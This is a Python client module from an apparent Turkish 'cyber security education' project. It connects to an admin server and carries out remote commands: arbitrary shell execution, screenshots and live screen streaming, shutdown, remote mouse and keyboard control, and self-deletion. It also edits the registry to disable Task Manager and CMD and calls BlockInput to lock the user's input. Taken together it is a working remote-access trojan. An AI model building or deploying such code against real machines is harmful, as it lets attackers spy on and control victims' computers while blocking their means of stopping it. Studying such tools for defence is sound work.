"""
Siber Guvenlik Egitim Projesi - Client
Admin'e baglanan ve komutlari uygulayan modul
"""

import socket
import threading
import time
import os
import sys
import subprocess
import base64
import ctypes
from typing import Callable, Optional

# Shared modulu icin path ekle
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from shared.protocol import Protocol, Message, CommandType, DEFAULT_PORT

# Windows icin gerekli
if sys.platform == 'win32':
    import winreg


class Client:
    """Client sinifi"""

    def __init__(self):
        self.socket: Optional[socket.socket] = None
        self.is_connected: bool = False
        self.server_ip: str = ""
        self.server_port: int = DEFAULT_PORT

        # Callback fonksiyonlari
        self.on_connected: Optional[Callable] = None
        self.on_disconnected: Optional[Callable] = None
        self.on_message_received: Optional[Callable] = None
        self.on_alert_received: Optional[Callable] = None
        self.on_command_executed: Optional[Callable] = None
        self.on_log: Optional[Callable] = None

        # Thread
        self.receive_thread: Optional[threading.Thread] = None

    def log(self, message: str):
        """Log mesaji"""
        if self.on_log:
            self.on_log(message)
        else:
            print(f"[CLIENT] {message}")

    def connect(self, ip: str, code: str, port: int = DEFAULT_PORT) -> bool:
        """Sunucuya baglan"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(10)
            self.socket.connect((ip, port))

            # Baglanti kodu gonder
            connect_msg = Message(
                command=CommandType.CONNECT.value,
                data={'code': code},
                timestamp=time.time()
            )
            Protocol.send_message(self.socket, connect_msg)

            # Cevap bekle
            response = Protocol.receive_message(self.socket)
            if response and response.data.get('status') == 'accepted':
                self.is_connected = True
                self.server_ip = ip
                self.server_port = port
                
                # Socket'i blocking mode'a al
                self.socket.settimeout(None)
                self.socket.setblocking(True)

                self.log(f"Sunucuya baglandi: {ip}:{port}")

                if self.on_connected:
                    self.on_connected()

                # Mesaj alma thread'i
                self.receive_thread = threading.Thread(
                    target=self._receive_messages, daemon=True
                )
                self.receive_thread.start()

                return True
            else:
                reason = response.data.get('reason', 'Bilinmeyen hata') if response else 'Cevap alinamadi'
                self.log(f"Baglanti reddedildi: {reason}")
                self.socket.close()
                return False

        except Exception as e:
            self.log(f"Baglanti hatasi: {e}")
            if self.socket:
                self.socket.close()
            return False

    def disconnect(self):
        """Baglantivi kes"""
        if self.is_connected and self.socket:
            try:
                disconnect_msg = Message(
                    command=CommandType.DISCONNECT.value,
                    data={},
                    timestamp=time.time()
                )
                Protocol.send_message(self.socket, disconnect_msg)
            except:
                pass

        self.is_connected = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None

        self.log("Baglanti kesildi")

        if self.on_disconnected:
            self.on_disconnected()

    def _receive_messages(self):
        """Mesajlari al ve isle"""
        import select
        
        while self.is_connected:
            try:
                if not self.socket:
                    break

                # Select kullanarak bekle
                ready = select.select([self.socket], [], [], 1.0)
                if not ready[0]:
                    continue

                msg = Protocol.receive_message(self.socket)

                if msg:
                    self._handle_command(msg)
                else:
                    self._handle_disconnect()
                    break

            except Exception as e:
                if self.is_connected:
                    self.log(f"Mesaj alma hatasi: {e}")
                    self._handle_disconnect()
                break

    def _handle_disconnect(self):
        """Baglanti kopma durumu"""
        self.is_connected = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None

        self.log("Sunucu baglantisi kesildi")

        if self.on_disconnected:
            self.on_disconnected()

    def _handle_command(self, msg: Message):
        """Gelen komutu isle"""
        command = msg.command
        data = msg.data

        self.log(f"Komut alindi: {command}")

        if self.on_message_received:
            self.on_message_received(msg)

        # Komutu calistir
        try:
            if command == CommandType.SHUTDOWN.value:
                self._shutdown()
            elif command == CommandType.RESTART.value:
                self._restart()
            elif command == CommandType.MESSAGE.value:
                self._show_message(data.get('text', ''))
            elif command == CommandType.ALERT.value:
                self._show_alert(data.get('title', 'Uyari'), data.get('text', ''))
            elif command == CommandType.SCREENSHOT.value:
                self._take_screenshot()
            elif command == CommandType.DISABLE_TASKMGR.value:
                self._disable_task_manager()
            elif command == CommandType.ENABLE_TASKMGR.value:
                self._enable_task_manager()
            elif command == CommandType.DISABLE_CMD.value:
                self._disable_cmd()
            elif command == CommandType.ENABLE_CMD.value:
                self._enable_cmd()
            elif command == CommandType.EXECUTE.value:
                self._execute(data.get('command', ''))
            elif command == CommandType.UNINSTALL.value:
                self._uninstall()
            # Yeni komutlar
            elif command == CommandType.DISABLE_MOUSE.value:
                self._disable_mouse()
            elif command == CommandType.ENABLE_MOUSE.value:
                self._enable_mouse()
            elif command == CommandType.DISABLE_KEYBOARD.value:
                self._disable_keyboard()
            elif command == CommandType.ENABLE_KEYBOARD.value:
                self._enable_keyboard()
            elif command == CommandType.START_STREAM.value:
                self._start_stream(data.get('fps', 30), data.get('quality', 480))
            elif command == CommandType.STOP_STREAM.value:
                self._stop_stream()
            elif command == CommandType.MOUSE_CLICK.value:
                self._remote_mouse_click(data)
            elif command == CommandType.MOUSE_MOVE.value:
                self._remote_mouse_move(data)
            elif command == CommandType.KEY_PRESS.value:
                self._remote_key_press(data.get('key', ''))

            if self.on_command_executed:
                self.on_command_executed(command, True)

        except Exception as e:
            self.log(f"Komut calistirma hatasi: {e}")
            if self.on_command_executed:
                self.on_command_executed(command, False)

    def send_chat(self, text: str):
        """Chat mesaji gonder"""
        if not self.is_connected or not self.socket:
            return False

        try:
            msg = Message(
                command=CommandType.CHAT.value,
                data={'text': text},
                timestamp=time.time()
            )
            return Protocol.send_message(self.socket, msg)
        except Exception as e:
            self.log(f"Mesaj gonderme hatasi: {e}")
            return False

    def send_log(self, text: str):
        """Log mesaji gonder"""
        if not self.is_connected or not self.socket:
            return False

        try:
            msg = Message(
                command=CommandType.LOG.value,
                data={'text': text},
                timestamp=time.time()
            )
            return Protocol.send_message(self.socket, msg)
        except:
            return False

    # Komut fonksiyonlari
    def _shutdown(self):
        """PC'yi kapat"""
        self.log("PC kapatiliyor...")
        if sys.platform == 'win32':
            os.system("shutdown /s /t 5 /c \"Admin tarafindan kapatiliyor\"")
        else:
            os.system("shutdown -h now")

    def _restart(self):
        """PC'yi yeniden baslat"""
        self.log("PC yeniden baslatiliyor...")
        if sys.platform == 'win32':
            os.system("shutdown /r /t 5 /c \"Admin tarafindan yeniden baslatiliyor\"")
        else:
            os.system("shutdown -r now")

    def _show_message(self, text: str):
        """Mesaj goster (GUI callback'i kullanir)"""
        if self.on_message_received:
            pass  # GUI tarafinda islenir

    def _show_alert(self, title: str, text: str):
        """Uyari mesaji goster"""
        if self.on_alert_received:
            self.on_alert_received(title, text)
        elif sys.platform == 'win32':
            ctypes.windll.user32.MessageBoxW(0, text, title, 0x30)

    def _take_screenshot(self):
        """Ekran goruntusu al ve gonder"""
        try:
            from PIL import ImageGrab
            import io

            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG', optimize=True)
            image_data = base64.b64encode(buffer.getvalue()).decode('utf-8')

            msg = Message(
                command=CommandType.SCREENSHOT_RESPONSE.value,
                data={'image': image_data},
                timestamp=time.time()
            )
            Protocol.send_message(self.socket, msg)
            self.log("Ekran goruntusu gonderildi")

        except Exception as e:
            self.log(f"Ekran goruntusu hatasi: {e}")

    def _disable_task_manager(self):
        """Gorev yoneticisini devre disi birak"""
        if sys.platform == 'win32':
            try:
                key = winreg.CreateKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
                )
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
                self.log("Gorev yoneticisi devre disi birakildi")
            except Exception as e:
                self.log(f"Gorev yoneticisi devre disi birakma hatasi: {e}")

    def _enable_task_manager(self):
        """Gorev yoneticisini etkinlestir"""
        if sys.platform == 'win32':
            try:
                key = winreg.CreateKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
                )
                winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
                winreg.CloseKey(key)
                self.log("Gorev yoneticisi etkinlestirildi")
            except Exception as e:
                self.log(f"Gorev yoneticisi etkinlestirme hatasi: {e}")

    def _disable_cmd(self):
        """CMD'yi devre disi birak"""
        if sys.platform == 'win32':
            try:
                key = winreg.CreateKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Policies\Microsoft\Windows\System"
                )
                winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(key)
                self.log("CMD devre disi birakildi")
            except Exception as e:
                self.log(f"CMD devre disi birakma hatasi: {e}")

    def _enable_cmd(self):
        """CMD'yi etkinlestir"""
        if sys.platform == 'win32':
            try:
                key = winreg.CreateKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Policies\Microsoft\Windows\System"
                )
                winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 0)
                winreg.CloseKey(key)
                self.log("CMD etkinlestirildi")
            except Exception as e:
                self.log(f"CMD etkinlestirme hatasi: {e}")

    def _execute(self, command: str):
        """Komut calistir"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            output = result.stdout + result.stderr
            self.log(f"Komut calistirildi: {command}")
            self.send_log(f"Komut: {command}\nCikti: {output[:500]}")
        except Exception as e:
            self.log(f"Komut calistirma hatasi: {e}")

    def _uninstall(self):
        """Kendini sil"""
        self.log("Uygulama kaldiriliyor...")
        self.disconnect()

        if sys.platform == 'win32':
            # Kendini silmek icin batch dosyasi olustur
            batch_content = f'''
@echo off
timeout /t 3 /nobreak > nul
del /f /q "{sys.executable}"
del /f /q "%~f0"
'''
            batch_path = os.path.join(os.environ['TEMP'], 'uninstall.bat')
            with open(batch_path, 'w') as f:
                f.write(batch_content)
            os.startfile(batch_path)

        sys.exit(0)

    # ========== YENİ FONKSIYONLAR ==========

    def _disable_mouse(self):
        """Fareyi devre disi birak (Windows)"""
        if sys.platform == 'win32':
            try:
                ctypes.windll.user32.BlockInput(True)
                self.log("Fare/Klavye devre disi birakildi")
            except Exception as e:
                self.log(f"Fare devre disi birakma hatasi: {e}")

    def _enable_mouse(self):
        """Fareyi etkinlestir (Windows)"""
        if sys.platform == 'win32':
            try:
                ctypes.windll.user32.BlockInput(False)
                self.log("Fare/Klavye etkinlestirildi")
            except Exception as e:
                self.log(f"Fare etkinlestirme hatasi: {e}")

    def _disable_keyboard(self):
        """Klavyeyi devre disi birak - BlockInput fare+klavye birlikte"""
        self._disable_mouse()

    def _enable_keyboard(self):
        """Klavyeyi etkinlestir"""
        self._enable_mouse()

    # Ekran Akisi
    def _start_stream(self, fps: int = 30, quality: int = 480):
        """Ekran akisini baslat"""
        self.streaming = True
        self.stream_fps = fps
        self.stream_quality = quality
        
        def stream_thread():
            try:
                from PIL import ImageGrab
                import io
                
                interval = 1.0 / fps
                while self.streaming and self.is_connected:
                    try:
                        screenshot = ImageGrab.grab()
                        
                        # Kaliteye gore boyutlandir
                        ratio = quality / screenshot.height
                        new_size = (int(screenshot.width * ratio), quality)
                        screenshot = screenshot.resize(new_size)
                        
                        # JPEG olarak sıkıştır (daha kaliteli)
                        buffer = io.BytesIO()
                        screenshot.save(buffer, format='JPEG', quality=70)
                        image_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
                        
                        # Frame gonder
                        msg = Message(
                            command=CommandType.STREAM_FRAME.value,
                            data={'image': image_data},
                            timestamp=time.time()
                        )
                        Protocol.send_message(self.socket, msg)
                        
                        time.sleep(interval)
                    except Exception as e:
                        self.log(f"Stream frame hatasi: {e}")
                        break
            except ImportError:
                self.log("PIL yuklu degil, ekran akisi yapilamaz")
        
        self.stream_thread = threading.Thread(target=stream_thread, daemon=True)
        self.stream_thread.start()
        self.log(f"Ekran akisi baslatildi: {fps} FPS, {quality}p")

    def _stop_stream(self):
        """Ekran akisini durdur"""
        self.streaming = False
        self.log("Ekran akisi durduruldu")

    # Uzaktan Kontrol
    def _remote_mouse_click(self, data: dict):
        """Uzaktan fare tiklama"""
        if sys.platform != 'win32':
            return
            
        try:
            import pyautogui
            
            # Koordinatlari hesapla
            x = data.get('x', 0)
            y = data.get('y', 0)
            label_w = data.get('label_w', 1)
            label_h = data.get('label_h', 1)
            button = data.get('button', 'left').lower()
            
            # Ekran boyutuna oranla
            screen_w, screen_h = pyautogui.size()
            real_x = int((x / label_w) * screen_w)
            real_y = int((y / label_h) * screen_h)
            
            pyautogui.click(real_x, real_y, button=button)
            self.log(f"Uzaktan tiklama: ({real_x}, {real_y})")
            
        except ImportError:
            self.log("pyautogui yuklu degil")
        except Exception as e:
            self.log(f"Uzaktan tiklama hatasi: {e}")

    def _remote_mouse_move(self, data: dict):
        """Uzaktan fare hareketi"""
        if sys.platform != 'win32':
            return
            
        try:
            import pyautogui
            
            x = data.get('x', 0)
            y = data.get('y', 0)
            label_w = data.get('label_w', 1)
            label_h = data.get('label_h', 1)
            
            screen_w, screen_h = pyautogui.size()
            real_x = int((x / label_w) * screen_w)
            real_y = int((y / label_h) * screen_h)
            
            pyautogui.moveTo(real_x, real_y)
            
        except ImportError:
            pass
        except Exception as e:
            self.log(f"Uzaktan fare hareketi hatasi: {e}")

    def _remote_key_press(self, key: str):
        """Uzaktan klavye tusu"""
        if sys.platform != 'win32' or not key:
            return
            
        try:
            import pyautogui
            
            # Tuş kombinasyonu kontrolü (örn: alt+f4, ctrl+c, fn+f10)
            if '+' in key:
                keys = key.lower().split('+')
                
                # Fn tuşu özel durumu - sadece modifier olmadan tuşu bas
                if 'fn' in keys:
                    # Fn tuşu pyautogui ile gönderilemez, doğrudan tuşu gönder
                    actual_key = [k for k in keys if k != 'fn'][0] if len(keys) > 1 else keys[0]
                    pyautogui.press(actual_key)
                    self.log(f"Uzaktan tus: {actual_key} (Fn simule edilemez)")
                else:
                    # Normal hotkey (alt+f4, ctrl+c, vb.)
                    pyautogui.hotkey(*keys)
                    self.log(f"Uzaktan hotkey: {key}")
            else:
                # Tek tuş
                pyautogui.press(key)
                self.log(f"Uzaktan tus: {key}")
                
        except ImportError:
            self.log("pyautogui yuklu degil")
        except Exception as e:
            self.log(f"Uzaktan tus hatasi: {e}")


if __name__ == "__main__":
    # Test
    client = Client()
    ip = input("Sunucu IP: ")
    code = input("Baglanti kodu: ")

    if client.connect(ip, code):
        print("Baglanti basarili!")
        try:
            while client.is_connected:
                time.sleep(1)
        except KeyboardInterrupt:
            client.disconnect()
    else:
        print("Baglanti basarisiz!")

